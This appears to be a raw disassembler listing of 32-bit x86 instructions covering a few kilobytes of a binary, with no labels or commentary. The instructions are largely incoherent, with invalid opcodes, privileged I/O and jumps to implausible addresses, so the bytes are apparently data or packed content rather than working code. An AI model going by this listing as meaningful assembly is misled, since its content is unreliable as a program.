  4242c4:	jb     0x424342
  4242c6:	repz pop eax
  4242c8:	rcr    eax,0xad
  4242cb:	inc    cx
  4242cd:	push   ds
  4242ce:	test   eax,0xd3f0e4a9
  4242d3:	sti    
  4242d4:	int    0xd
  4242d6:	sub    DWORD PTR [ebx-0x38ad8e33],edx
  4242dc:	pusha  
  4242dd:	jae    0x4242ff
  4242df:	pop    esi
  4242e0:	es xor eax,edx
  4242e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242e4:	(bad)  
  4242e6:	inc    edx
  4242e7:	pusha  
  4242e8:	sbb    DWORD PTR ds:0x274be352,esi
  4242ee:	mov    al,0xe1
  4242f0:	imul   ebx,DWORD PTR [ecx+ebx*4],0xc91c6139
  4242f7:	mov    BYTE PTR [edi-0x1bc779c9],dh
  4242fd:	mov    eax,ds:0xeb6731b
  424302:	mov    esi,0x6795ff71
  424307:	mov    ds:0x5b4fe5b6,eax
  42430c:	retf   0x9a59
  42430f:	jl     0x42433b
  424311:	imul   edi,DWORD PTR [ecx],0xb93b7972
  424317:	xor    eax,0xe539875d
  42431c:	bound  edx,QWORD PTR [edx+edx*1]
  42431f:	adc    DWORD PTR [ebx],edx
  424321:	in     al,dx
  424322:	mov    BYTE PTR [edx+ebx*2+0x5d],bl
  424326:	mov    cl,0x77
  424328:	adc    DWORD PTR [ebp+0x50],ebp
  42432b:	daa    
  42432c:	pushf  
  42432d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42432e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42432f:	repnz test eax,0x490d2803
  424335:	add    cl,ch
  424337:	and    dl,bl
  424339:	push   esi
  42433a:	div    DWORD PTR [ebx]
  42433c:	ret    0x512
  42433f:	mov    BYTE PTR [di+0xc],cl
  424343:	outs   dx,BYTE PTR ds:[esi]
  424344:	iret   
  424345:	mov    ebp,0xe6da0817
  42434a:	or     al,BYTE PTR [edx]
  42434c:	adc    esi,0xf57ceffe
  424352:	clc    
  424353:	sub    DWORD PTR [esi+edx*1+0x1d],ebx
  424357:	mov    dh,0x90
  424359:	inc    ecx
  42435a:	lds    ebx,FWORD PTR [esi-0x9253a72]
  424360:	jbe    0x424352
  424362:	fnsave es:[ebp-0x24331d45]
  424369:	loop   0x424314
  42436b:	sub    ch,BYTE PTR [ecx]
  42436d:	jmp    FWORD PTR [ecx+0x3ace1755]
  424373:	ds xchg edx,eax
  424375:	retf   
  424376:	mov    ah,BYTE PTR [ebp+eax*1+0x1a2b3ca8]
  42437d:	cmp    edi,DWORD PTR [ecx+0x3a22b59a]
  424383:	push   edx
  424384:	cld    
  424385:	retf   
  424386:	arpl   WORD PTR [edx-0x30],bx
  424389:	xlat   BYTE PTR ds:[ebx]
  42438a:	call   0x37253c94
  42438f:	add    dh,BYTE PTR [ebx+0x6c13c2b7]
  424395:	retf   0x2646
  424398:	mov    WORD PTR ds:0x73e7a961,?
  42439e:	add    BYTE PTR [esi+0xcdfba6f],bh
  4243a4:	sbb    eax,0xddd56f5f
  4243a9:	into   
  4243aa:	das    
  4243ab:	pop    ebp
  4243ac:	retf   
  4243ad:	test   ebp,ebp
  4243af:	jecxz  0x42436f
  4243b1:	loope  0x424371
  4243b3:	xchg   ebp,eax
  4243b4:	pusha  
  4243b5:	push   ebx
  4243b6:	rcl    esi,0x37
  4243b9:	data16 and BYTE PTR [ecx],0x58
  4243bd:	mov    BYTE PTR ds:0x77e1c0c3,dh
  4243c3:	pop    esi
  4243c4:	xchg   edi,eax
  4243c5:	cmp    al,BYTE PTR [esi+esi*1-0x1f84c8fe]
  4243cc:	popf   
  4243cd:	jmp    0x4243cd
  4243cf:	scas   eax,DWORD PTR es:[edi]
  4243d0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4243d2:	loopne 0x42436d
  4243d4:	ret    
  4243d5:	sar    DWORD PTR [edi+ebp*8+0x5e0c6286],1
  4243dc:	jns    0x424377
  4243de:	pop    edi
  4243df:	bound  edx,QWORD PTR [edx]
  4243e1:	cmp    DWORD PTR [esi+0x4],0xffffff8a
  4243e5:	mov    bl,0xe
  4243e7:	lahf   
  4243e8:	mov    edx,0xd4915f
  4243ed:	fsub   DWORD PTR [esi]
  4243ef:	into   
  4243f0:	rcr    bh,0xa1
  4243f3:	dec    esi
  4243f4:	xchg   ecx,eax
  4243f5:	adc    bl,BYTE PTR [ebp+0x5eecf312]
  4243fb:	adc    ch,BYTE PTR [esp+eiz*2+0x5450ec26]
  424402:	push   ebp
  424403:	cmp    al,bh
  424405:	pop    edx
  424406:	cli    
  424407:	pop    edi
  424408:	sub    BYTE PTR [edi+0x5b],ch
  42440b:	in     al,0xee
  42440d:	outs   dx,BYTE PTR ds:[esi]
  42440e:	dec    edx
  42440f:	push   ss
  424410:	cmp    dh,BYTE PTR [ebx+0x49]
  424413:	popa   
  424414:	(bad)  
  424415:	arpl   si,dx
  424417:	jle    0x42443a
  424419:	pop    ss
  42441a:	neg    BYTE PTR [ebx]
  42441c:	and    eax,0xd19d3341
  424421:	mov    al,ds:0xffd13f7c
  424426:	stos   DWORD PTR es:[edi],eax
  424427:	xchg   ecx,eax
  424428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424429:	and    bh,BYTE PTR [ebp+0x3df91a8c]
  42442f:	sub    eax,0x1f0d8bd9
  424434:	lahf   
  424435:	mov    ebp,0x59784c55
  42443a:	out    dx,al
  42443b:	mov    cl,0x45
  42443d:	fisubr WORD PTR [ebx]
  42443f:	xchg   edx,eax
  424440:	mov    esi,fs
  424442:	dec    ebp
  424443:	push   esp
  424444:	clc    
  424445:	cmc    
  424446:	ret    
  424447:	movlhps xmm1,xmm4
  42444a:	xor    eax,DWORD PTR [eax-0x4ab96227]
  424450:	icebp  
  424451:	sbb    esi,DWORD PTR [ebp+esi*8+0x7b]
  424455:	imul   esi,DWORD PTR [edi+ebp*2-0x46],0x6012e617
  42445d:	or     DWORD PTR [ecx-0x771a0e97],ecx
  424463:	dec    eax
  424464:	hlt    
  424465:	xchg   esp,eax
  424466:	sub    al,0xc6
  424468:	(bad)  
  424469:	sbb    eax,esp
  42446b:	and    bl,dl
  42446d:	sbb    eax,0x772ceac5
  424472:	sub    eax,0x3b66226b
  424477:	stos   DWORD PTR es:[edi],eax
  424478:	mov    bl,0x96
  42447a:	inc    esp
  42447b:	or     eax,ecx
  42447d:	mov    es,WORD PTR [ebx]
  42447f:	cld    
  424480:	xor    DWORD PTR [ebx-0x67],esi
  424483:	(bad)  
  424484:	iret   
  424485:	mov    esp,0xbc0f61bf
  42448a:	cmp    ah,BYTE PTR [ebx]
  42448c:	ins    BYTE PTR es:[edi],dx
  42448d:	inc    ecx
  42448e:	xchg   ebx,eax
  42448f:	mov    bl,0x1f
  424491:	mov    esp,0xfc4e0e9
  424496:	scas   eax,DWORD PTR es:[edi]
	...
  424513:	add    BYTE PTR [esi],cl
  424515:	pop    esp
  424516:	mov    esp,0xffe7fe47
  42451b:	pop    ebp
  42451c:	es mov eax,0x3f0bfe17
  424522:	lea    edx,[eax+0xf]
  424525:	fld    DWORD PTR [ecx]
  424527:	add    BYTE PTR [ebx+0x7],ch
  42452a:	add    BYTE PTR [eax],al
  42452c:	add    BYTE PTR [edi],ah
  42452e:	inc    eax
  42452f:	sub    bh,ah
  424531:	or     BYTE PTR [esi],ch
  424533:	(bad)  
  424535:	pop    esp
  424536:	mov    bh,0x92
  424538:	ror    esp,0x90
  42453b:	lea    esi,[ebx]
  42453d:	jne    0x4244cc
  42453f:	cs loop 0x42457c
  424542:	push   ds
  424543:	push   ds
  424544:	mov    dl,0x42
  424546:	add    eax,0x4fcd7e7e
  42454b:	dec    eax
  42454c:	cli    
  42454d:	stos   BYTE PTR es:[edi],al
  42454e:	mov    dl,0xce
  424550:	sti    
  424551:	and    BYTE PTR [esi-0x1534b0ca],dh
  424557:	push   edx
  424558:	inc    eax
  424559:	jb     0x424538
  42455b:	adc    DWORD PTR [edx-0x41105a25],0xffffffbe
  424562:	xchg   DWORD PTR [eax-0x3c5e4f60],esp
  424568:	je     0x42452c
  42456a:	sbb    ch,BYTE PTR [ebx]
  42456c:	lods   eax,DWORD PTR ds:[esi]
  42456d:	mov    ecx,0x3c32ab8e
  424572:	adc    esp,eax
  424574:	mov    cl,al
  424576:	retf   0x69fa
  424579:	lods   al,BYTE PTR ds:[esi]
  42457a:	dec    edx
  42457b:	mov    ebp,0x112dabac
  424580:	sub    ebx,ebx
  424582:	or     dl,BYTE PTR ss:[esp+ebp*1]
  424586:	mov    dl,0xc3
  424588:	push   0xffffffc3
  42458a:	cwde   
  42458b:	(bad)  
  42458c:	xor    eax,0xf94185c1
  424591:	sbb    al,0x97
  424593:	ja     0x4245ee
  424595:	mov    eax,ds:0x22e041b8
  42459a:	add    al,0x8f
  42459c:	mov    ?,WORD PTR [edx+0x3d65b886]
  4245a2:	sub    BYTE PTR [ebp-0xa],ch
  4245a5:	popa   
  4245a6:	shl    BYTE PTR [ecx+eax*8-0x711fd4b],0x8c
  4245ae:	jno    0x42454c
  4245b0:	sbb    ch,al
  4245b2:	dec    ebx
  4245b3:	imul   eax,ebp,0x9a2e2a9
  4245b9:	adc    al,0x44
  4245bb:	sar    BYTE PTR [ebp-0x33],1
  4245be:	int3   
  4245bf:	scas   al,BYTE PTR es:[edi]
  4245c0:	jno    0x424552
  4245c2:	retf   0x6535
  4245c5:	pop    es
  4245c6:	out    dx,eax
  4245c7:	mov    dh,BYTE PTR [edx]
  4245c9:	cmc    
  4245ca:	enter  0x5bd5,0x48
  4245ce:	fstp   QWORD PTR [esi]
  4245d0:	pop    esp
  4245d1:	aas    
  4245d2:	loopne 0x424614
  4245d4:	arpl   WORD PTR [ecx+ebp*2-0x575fcd92],dx
  4245db:	and    ebx,esi
  4245dd:	push   eax
  4245de:	and    dl,ah
  4245e0:	pop    ss
  4245e1:	fs cmp edx,ebx
  4245e4:	mov    DWORD PTR [eax],eax
  4245e6:	pop    ds
  4245e7:	push   es
  4245e8:	push   ebp
  4245e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245ea:	js     0x424623
  4245ec:	mov    ds:0x6c7e0099,al
  4245f1:	mov    esp,0x118ee754
  4245f6:	and    al,0xf4
  4245f8:	push   ebx
  4245f9:	lea    edi,[edx+ebx*8+0x6e63593f]
  424600:	add    al,0xf7
  424602:	cdq    
  424603:	es pop ebp
  424605:	ficom  DWORD PTR [edx-0x40]
  424608:	and    BYTE PTR [esi*8-0x59d309ef],al
  42460f:	mov    ah,0xd9
  424611:	sar    BYTE PTR [edi],cl
  424613:	or     al,0x49
  424615:	add    al,0xdc
  424617:	fwait
  424618:	imul   esi,DWORD PTR [eax],0x8ec91d3c
  42461e:	or     eax,0xef8990bd
  424623:	pushf  
  424624:	imul   esi,ecx,0x3ae1a490
  42462a:	fst    DWORD PTR [eax+0xb]
  42462d:	xor    ecx,DWORD PTR [ebx-0x372a7e3e]
  424633:	scas   al,BYTE PTR es:[edi]
  424634:	popf   
  424635:	jmp    0x452d22dd
  42463a:	ds xor eax,0x948944fe
  424640:	or     edx,esp
  424642:	std    
  424643:	(bad)  
  424644:	fild   WORD PTR [edi+eiz*8-0x48]
  424648:	sbb    BYTE PTR [esp+ecx*1+0xe],bh
  42464c:	or     eax,0xd49824d
  424651:	test   dl,dl
  424653:	cmp    ebx,DWORD PTR [ecx]
  424655:	loope  0x424684
  424657:	cmp    BYTE PTR [edi+0x5b],al
  42465a:	cvtps2pi mm4,xmm5
  42465d:	call   0xe1fe6bc8
  424662:	mov    BYTE PTR [ecx],ah
  424664:	jmp    0xd2652486
  424669:	test   ebx,eax
  42466b:	push   cs
  42466c:	push   esp
  42466d:	stc    
  42466e:	mov    dl,bh
  424670:	arpl   WORD PTR [ebp+0x4b],cx
  424673:	or     BYTE PTR [eax-0x7e25e03b],al
  424679:	push   ss
  42467a:	dec    edx
  42467b:	mov    dh,0xd
  42467d:	pop    esp
  42467e:	adc    al,0xbd
  424680:	inc    edi
  424681:	and    BYTE PTR [edi],ch
  424683:	sub    DWORD PTR [edx-0x39],eax
  424686:	arpl   WORD PTR [edx+0x517d2b3e],bx
  42468c:	leave  
  42468d:	in     al,dx
  42468e:	adc    cl,ah
  424690:	dec    edx
  424691:	outs   dx,DWORD PTR es:[esi]
  424693:	stc    
  424694:	and    ebp,eax
  424696:	inc    edx
  424697:	dec    ebx
  424698:	gs jl  0x424663
  42469b:	inc    esi
  42469c:	and    bl,BYTE PTR [ebp-0x5a557576]
  4246a2:	in     eax,dx
  4246a3:	mov    ds:0xce474665,al
  4246a8:	mov    cl,0xe7
  4246aa:	xor    eax,0x2808790f
  4246af:	into   
  4246b0:	shl    edx,cl
  4246b2:	pop    es
  4246b3:	or     edi,DWORD PTR [esi]
  4246b5:	pop    esp
  4246b6:	mov    BYTE PTR [eax],dh
  4246b8:	mov    ch,0x2b
  4246ba:	ins    BYTE PTR es:[edi],dx
  4246bb:	inc    ebp
  4246bc:	mov    ecx,0xef04d76a
  4246c1:	imul   eax,ecx,0xffffffbe
  4246c4:	call   0xa964:0x8d10ff37
  4246cb:	push   ds
  4246cc:	cmc    
  4246cd:	push   ebp
  4246ce:	test   DWORD PTR [edx],0x70e888bb
  4246d4:	popf   
  4246d5:	or     eax,0xf1f05513
  4246da:	lods   eax,DWORD PTR ds:[esi]
  4246db:	sahf   
  4246dc:	leave  
  4246dd:	out    0x12,eax
  4246df:	mov    al,0xa1
  4246e1:	pop    ebp
  4246e2:	jg     0x42473f
  4246e4:	jecxz  0x424667
  4246e6:	pop    ebx
  4246e7:	(bad)  
  4246e8:	call   0x4278c975
  4246ed:	jp     0x424721
  4246ef:	mov    bl,0xbb
  4246f1:	jmp    0x9e:0x83ca8a5c
  4246f8:	inc    ebp
  4246f9:	cmp    edx,eax
  4246fb:	pop    ebp
  4246fc:	xor    eax,0x9072c294
  424701:	(bad)  
  424702:	mov    ebx,0x46e6f256
  424707:	dec    ecx
  424708:	dec    ebx
  424709:	leave  
  42470a:	pop    ss
  42470b:	je     0x4246a6
  42470d:	dec    edi
  42470e:	iret   
  42470f:	hlt    
  424710:	(bad)  
  424711:	xor    eax,0x66d97d54
  424716:	xor    DWORD PTR [edx],ecx
  424718:	inc    esp
  424719:	retf   
  42471a:	jne    0x42469c
  42471c:	cmp    DWORD PTR [edx+0x743c4e8c],ebx
  424722:	out    0x96,eax
  424724:	jmp    0x9ee0:0xbfce8be1
  42472b:	retf   
  42472c:	mov    cl,0xa2
  42472e:	into   
  42472f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424730:	adc    edi,DWORD PTR ds:0x9fb2f63
  424736:	and    dl,BYTE PTR [ecx+0x1]
  424739:	xchg   edx,eax
  42473a:	push   edx
  42473b:	imul   esp,DWORD PTR [ecx+ecx*8],0x1e
  42473f:	ret    
  424740:	retf   0xb42a
  424743:	mov    eax,ds:0xd3c73962
  424748:	out    0x46,eax
  42474a:	sub    edi,edi
  42474c:	fdiv   st(2),st
  42474e:	mov    al,ds:0x6331c3b3
  424753:	pop    esi
  424754:	push   edx
  424755:	js     0x424764
  424757:	or     eax,0x31760041
  42475c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42475d:	push   esp
  42475e:	push   eax
  42475f:	test   esp,eax
  424761:	aad    0xc6
  424763:	test   BYTE PTR [ebx],ah
  424765:	push   esp
  424766:	enter  0x96df,0x9b
  42476a:	cdq    
  42476b:	hlt    
  42476c:	add    DWORD PTR [esi],esp
  42476e:	scas   al,BYTE PTR es:[edi]
  42476f:	mov    ah,0x78
  424771:	ja     0x424739
  424773:	jecxz  0x4247bb
  424775:	cwde   
  424776:	loop   0x42479e
  424778:	mov    al,0xf4
  42477a:	daa    
  42477b:	xchg   edi,eax
  42477c:	mov    bh,BYTE PTR [ebp-0x66]
  42477f:	cmp    BYTE PTR [esi-0x52],dh
  424782:	(bad)  
  424783:	pop    ss
  424784:	(bad)  
  424785:	arpl   WORD PTR [esi-0x62],sp
  424788:	xor    al,bl
  42478a:	inc    esp
  42478b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42478c:	aas    
  42478d:	ds aas 
  42478f:	stc    
  424790:	xchg   esi,eax
  424791:	jnp    0x424796
  424793:	mov    al,ds:0xef4b1d2
  424798:	or     edx,ebx
  42479a:	ja     0x42477e
  42479c:	repnz push ebp
  42479e:	or     ecx,DWORD PTR [ebx]
  4247a0:	sbb    BYTE PTR [edi+0x19],bl
  4247a3:	addr16 std 
  4247a5:	cmp    al,0x34
  4247a7:	sub    edi,edx
  4247a9:	or     eax,DWORD PTR [edi]
  4247ab:	xor    esi,DWORD PTR [esi]
  4247ad:	mov    esp,ds
  4247af:	test   al,0x7d
  4247b1:	test   BYTE PTR [esi-0x96024ad],ah
  4247b7:	(bad)  
  4247b8:	stos   DWORD PTR es:[edi],eax
  4247b9:	sub    al,0x22
  4247bb:	fstp   TBYTE PTR [esi+edx*4-0x22ffd78a]
  4247c2:	out    0x3d,al
  4247c4:	inc    edx
  4247c5:	test   al,0xb7
  4247c7:	push   ss
  4247c8:	outs   dx,BYTE PTR ds:[esi]
  4247c9:	jne    0x4247ab
  4247cb:	push   0x4f
  4247cd:	(bad)  
  4247ce:	mov    ds:0x87ff830b,al
  4247d3:	mov    bh,0x15
  4247d5:	call   0xef58:0x3b66bb1e
  4247dc:	add    edx,edi
  4247de:	outs   dx,BYTE PTR ds:[esi]
  4247df:	inc    esi
  4247e0:	loop   0x424851
  4247e2:	mov    ebp,0x6cebff31
  4247e7:	shl    ch,0xe4
  4247ea:	sub    dh,BYTE PTR [eax+0x10]
  4247ed:	mov    bl,0x4e
  4247ef:	inc    eax
  4247f0:	(bad)  
  4247f1:	mov    ch,0x0
  4247f3:	xchg   edx,eax
  4247f4:	xchg   ebx,eax
  4247f5:	lea    edx,[ebx]
  4247f7:	push   0x79
  4247f9:	sub    eax,0x9276e1f5
  4247fe:	jge    0x42484e
  424800:	sbb    al,0x7c
  424802:	push   0xffffffc9
  424804:	js     0x42483b
  424806:	push   esp
  424807:	ficomp WORD PTR [ebx+ecx*8+0x7dd0efdf]
  42480e:	or     edi,esp
  424810:	mov    eax,0xf3a451ad
  424815:	push   ebp
  424816:	jmp    0x44feb80f
  42481b:	jg     0x424882
  42481d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42481e:	iret   
  42481f:	in     eax,dx
  424820:	lods   eax,DWORD PTR ds:[esi]
  424821:	xlat   BYTE PTR ds:[ebx]
  424822:	dec    ebp
  424823:	sub    DWORD PTR [edx-0x1a7a25d3],ebp
  424829:	pop    eax
  42482a:	fwait
  42482b:	sahf   
  42482c:	jb     0x424868
  42482e:	push   eax
  42482f:	(bad)  
  424830:	cmp    DWORD PTR [ebp-0x41],ecx
  424833:	and    ah,dl
  424835:	and    esi,0xffffff9c
  424838:	aad    0x28
  42483a:	shr    BYTE PTR [esi-0x71],1
  42483d:	add    ebx,edi
  42483f:	ror    DWORD PTR [esi+0x6a446e27],cl
  424845:	jo     0x42489c
  424847:	xchg   ecx,eax
  424848:	test   al,0x12
  42484a:	inc    esi
  42484b:	sbb    BYTE PTR [edx+0x1b0151ed],dl
  424851:	add    edx,esp
  424853:	(bad)  
  424854:	(bad)  
  424855:	jle    0x424830
  424857:	sbb    ebp,DWORD PTR [ecx+0x9cdd9de]
  42485d:	ss cs push ebx
  424860:	shl    ch,0x9
  424863:	add    eax,0x39712271
  424868:	jmp    0x4248c3
  42486a:	cdq    
  42486b:	in     al,0xdb
  42486d:	mov    ch,0xa1
  42486f:	pop    es
  424870:	stos   BYTE PTR es:[edi],al
  424871:	jns    0x424818
  424873:	loop   0x42487f
  424875:	mov    cl,0x2d
  424877:	mov    esp,0x42f90f2c
  42487c:	sbb    BYTE PTR [edi],ah
  42487e:	mov    ah,0xc0
  424880:	jp     0x424803
  424882:	pop    edx
  424883:	ret    0xf7fa
  424886:	push   eax
  424887:	aaa    
  424888:	int    0xc5
  42488a:	jnp    0x424904
  42488c:	xor    al,0x6e
  42488e:	push   0x61
  424890:	psubsb mm5,QWORD PTR [ebx-0x71]
  424894:	daa    
  424895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424896:	jo     0x424904
  424898:	arpl   WORD PTR [esp+edx*2],ax
  42489b:	mov    eax,ds:0x136df4dc
  4248a0:	jge    0x424874
  4248a2:	iret   
  4248a3:	(bad)  
  4248a4:	data16 sub al,0x4c
  4248a7:	xor    ch,al
  4248a9:	in     eax,dx
  4248aa:	arpl   di,ax
  4248ac:	and    BYTE PTR [ecx+0x4d],ch
  4248af:	inc    ebp
  4248b0:	jno    0x424885
  4248b2:	cmp    eax,0xdba4c1f3
  4248b7:	mov    bh,0x24
  4248b9:	dec    ebp
  4248ba:	shl    BYTE PTR [ebp-0x1c],1
  4248bd:	popf   
  4248be:	fisttp QWORD PTR [ebx+0x567d9647]
  4248c4:	enter  0x152f,0x4d
  4248c8:	dec    edx
  4248c9:	loopne 0x424865
  4248cb:	adc    bl,dh
  4248cd:	test   DWORD PTR [edx+ebx*1+0x7155a11a],ebp
  4248d4:	pop    ds
  4248d5:	ins    DWORD PTR es:[edi],dx
  4248d6:	pop    eax
  4248d7:	adc    BYTE PTR [edx],dl
  4248d9:	(bad)  [esi+0x591e843a]
  4248df:	xlat   BYTE PTR ds:[ebx]
  4248e0:	mov    eax,0x97b41129
  4248e5:	pop    ebx
  4248e6:	add    bl,ch
  4248e8:	cmp    esi,eax
  4248ea:	xchg   esp,eax
  4248eb:	pop    ss
  4248ec:	inc    edi
  4248ed:	test   BYTE PTR [ebp+0x280aa3d7],dl
  4248f3:	add    bl,BYTE PTR [eax+esi*8-0x2d2537fd]
  4248fa:	fcom   st(4)
  4248fc:	mov    ch,bh
  4248fe:	mov    ebp,0x979481c2
  424903:	xchg   esp,eax
  424904:	retf   
  424905:	cmc    
  424906:	jg     0x424970
  424908:	imul   eax,DWORD PTR [ecx+0x1a37c8ad],0xfffffffb
  42490f:	jne    0x424927
  424911:	lods   al,BYTE PTR ds:[esi]
  424912:	ins    BYTE PTR es:[edi],dx
  424913:	lea    edx,[esi]
  424915:	int3   
  424916:	mov    ebx,0xb1527d75
  42491b:	jbe    0xad411b04
  424921:	cmp    DWORD PTR [edi],ecx
  424923:	mov    eax,ds:0x90f1e3cf
  424928:	sbb    DWORD PTR [edx+esi*4-0x4a],esp
  42492c:	stos   DWORD PTR es:[edi],eax
  42492d:	sub    BYTE PTR ds:0xf4e1b9fa,0x23
  424934:	pop    ds
  424935:	iret   
  424936:	cmc    
  424937:	push   ds
  424938:	mov    eax,0x868bffa1
  42493d:	out    dx,al
  42493e:	lea    ecx,[edi-0x563686dd]
  424944:	in     al,dx
  424945:	scas   al,BYTE PTR es:[edi]
  424946:	fs xchg esp,eax
  424948:	cwde   
  424949:	int3   
  42494a:	xor    BYTE PTR [esi+0x32],dl
  42494d:	sub    al,dh
  42494f:	and    BYTE PTR [ecx+0x73],bl
  424952:	jecxz  0x424995
  424954:	mov    DWORD PTR [edx+ebp*8-0x69665e30],0x9d279b70
  42495f:	(bad)  [edi-0x3deb2497]
  424965:	out    0x66,al
  424967:	scas   al,BYTE PTR es:[edi]
  424968:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42496a:	pop    ecx
  42496b:	xor    al,0xec
  42496d:	cmp    eax,0x26c4ba81
  424972:	lods   eax,DWORD PTR ds:[esi]
  424973:	or     al,0x39
  424975:	push   edi
  424976:	arpl   WORD PTR [eax+0x23],dx
  424979:	inc    eax
  42497a:	(bad)  
  42497b:	lds    ecx,FWORD PTR [esi-0x43b751b]
  424981:	jl     0x4249b5
  424983:	mov    edi,0x38e98afe
  424988:	dec    ebp
  424989:	push   ecx
  42498a:	inc    eax
  42498b:	lods   eax,DWORD PTR ds:[esi]
  42498c:	imul   DWORD PTR [edx]
  42498e:	and    DWORD PTR [esi-0x54],ecx
  424991:	dec    ebx
  424992:	mov    BYTE PTR ss:[ecx-0x40],bh
  424996:	and    al,BYTE PTR [ebp-0x30]
  424999:	out    0xb7,eax
  42499b:	mov    dh,BYTE PTR [ecx+edi*2-0x8379548]
  4249a2:	mov    esi,0x474861fb
  4249a7:	push   edx
  4249a8:	nop
  4249a9:	inc    esp
  4249aa:	push   esp
  4249ab:	lds    eax,FWORD PTR [ebp-0x22]
  4249ae:	xchg   ebx,eax
  4249af:	lods   eax,DWORD PTR ds:[esi]
  4249b0:	inc    esi
  4249b1:	mov    dh,0x4d
  4249b3:	mov    eax,0x799461de
  4249b8:	mov    esi,0x374e8ab7
  4249bd:	xchg   esp,eax
  4249be:	or     al,BYTE PTR [edx-0x2b170df5]
  4249c4:	in     eax,dx
  4249c5:	cs pop ss
  4249c7:	and    BYTE PTR [edx+0x73],bl
  4249ca:	and    DWORD PTR [ebx],ebx
  4249cc:	cld    
  4249cd:	stos   DWORD PTR es:[edi],eax
  4249ce:	and    DWORD PTR [ebx-0x49e0eddd],edx
  4249d4:	es push edi
  4249d6:	aad    0xb0
  4249d8:	push   ss
  4249d9:	loop   0x424977
  4249db:	scas   eax,DWORD PTR es:[edi]
  4249dc:	adc    BYTE PTR [ebx],dh
  4249de:	jbe    0x42497c
  4249e0:	sbb    ebp,DWORD PTR [ebx+0x2784a660]
  4249e6:	lds    ebx,FWORD PTR [eax+0x6fbf9539]
  4249ec:	mov    DWORD PTR [eax+esi*1+0x2f],edx
  4249f0:	add    al,0x1b
  4249f2:	aad    0xdb
  4249f4:	and    BYTE PTR [ebx+0x2ad1bf2f],dl
  4249fa:	pop    ebp
  4249fb:	xchg   ebp,eax
  4249fc:	test   al,0x97
  4249fe:	fmul   QWORD PTR [ebp-0x13]
  424a01:	push   esp
  424a02:	sbb    eax,0xf26b3ecb
  424a07:	lock dec edi
  424a09:	add    eax,0xf9dabc38
  424a0e:	cmp    dl,BYTE PTR [esi+0xd263cb0]
  424a14:	hlt    
  424a15:	jne    0x424a3c
  424a17:	inc    esp
  424a18:	jle    0x424a1f
  424a1a:	lahf   
  424a1b:	xchg   esi,eax
  424a1c:	add    BYTE PTR [eax+0x3b],0xad
  424a20:	imul   eax,DWORD PTR [esi-0xf],0x199debcc
  424a27:	mov    cl,0x68
  424a29:	add    eax,0x536fa06d
  424a2e:	enter  0x3a60,0xf4
  424a32:	push   cs
  424a33:	lds    ebp,FWORD PTR [esi]
  424a35:	mov    ds:0x46c07fb7,al
  424a3a:	dec    ebx
  424a3b:	push   0xa2a1199b
  424a40:	(bad)  
  424a41:	mov    bh,0xbd
  424a43:	fst    QWORD PTR [esi-0x5199cfae]
  424a49:	ret    
  424a4a:	push   ds
  424a4b:	lahf   
  424a4c:	ret    
  424a4d:	outs   dx,DWORD PTR ds:[esi]
  424a4e:	aam    0xb3
  424a50:	std    
  424a51:	mov    edi,0xec0b8c1e
  424a56:	jno    0x4249da
  424a58:	out    0xff,al
  424a5a:	xor    cl,BYTE PTR [edx-0x36ac122c]
  424a60:	mov    eax,ds:0x26b32b3e
  424a65:	dec    edx
  424a66:	inc    eax
  424a67:	imul   esi,ecx,0xffffffe5
  424a6a:	hlt    
  424a6b:	sub    BYTE PTR [edi+0x8a28721],ch
  424a71:	int    0x9d
  424a73:	mov    ch,0xac
  424a75:	retf   
  424a76:	mov    edx,0x11122613
  424a7b:	jmp    0xe4419b20
  424a80:	mov    esi,0x3e36a2ed
  424a85:	arpl   WORD PTR [esi*2+0x57d4eb04],dx
  424a8c:	mov    edi,0x5ad3a629
  424a91:	popf   
  424a92:	cmp    eax,0xc4949f0b
  424a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a98:	mov    eax,ds:0xafec61ef
  424a9d:	(bad)  
  424a9e:	dec    ebp
  424a9f:	mov    ebp,?
  424aa1:	or     eax,0x53f26145
  424aa6:	jae    0x424a6e
  424aa8:	or     al,0x6d
  424aaa:	push   0x317c3405
  424aaf:	inc    esp
  424ab0:	test   BYTE PTR [esi+0x5c20700b],cl
  424ab6:	jb     0x424a84
  424ab8:	fwait
  424ab9:	inc    ebx
  424aba:	cmp    eax,0xd1389128
  424abf:	js     0x424a50
  424ac1:	adc    eax,0x8bc976f
  424ac6:	cmp    BYTE PTR [ecx+0xa],cl
  424ac9:	fwait
  424aca:	mov    dh,0xb1
  424acc:	mov    bl,0x7b
  424ace:	push   cs
  424acf:	pop    esp
  424ad0:	stos   BYTE PTR es:[edi],al
  424ad1:	push   0xdece8bab
  424ad6:	cld    
  424ad7:	dec    ebp
  424ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ad9:	shl    DWORD PTR [ebp-0x1cabf1ac],0x4a
  424ae0:	inc    edi
  424ae1:	xor    al,0x16
  424ae3:	mov    edi,DWORD PTR [esp+eax*1-0x5e]
  424ae7:	(bad)  
  424ae8:	fst    st(0)
  424aea:	stos   DWORD PTR es:[edi],eax
  424aeb:	cli    
  424aec:	sbb    BYTE PTR [ebx+esi*8-0x4c],0x53
  424af1:	cs pop edi
  424af3:	mov    ebp,0xea6910e4
  424af8:	repz sbb eax,0x73232f3d
  424afe:	loope  0x424b13
  424b00:	sti    
  424b01:	cmp    dh,cl
  424b03:	push   0xfffffff7
  424b05:	inc    esi
  424b06:	ins    DWORD PTR es:[edi],dx
  424b07:	sbb    al,0xc4
  424b09:	dec    esi
  424b0a:	push   cs
  424b0b:	jno    0x424b86
  424b0d:	lods   eax,DWORD PTR ds:[esi]
  424b0e:	nop
  424b0f:	dec    ebp
  424b10:	pushf  
  424b11:	inc    eax
  424b12:	mov    esi,DWORD PTR [edi+0xa]
  424b15:	mov    ah,0x50
  424b17:	xor    al,0x1f
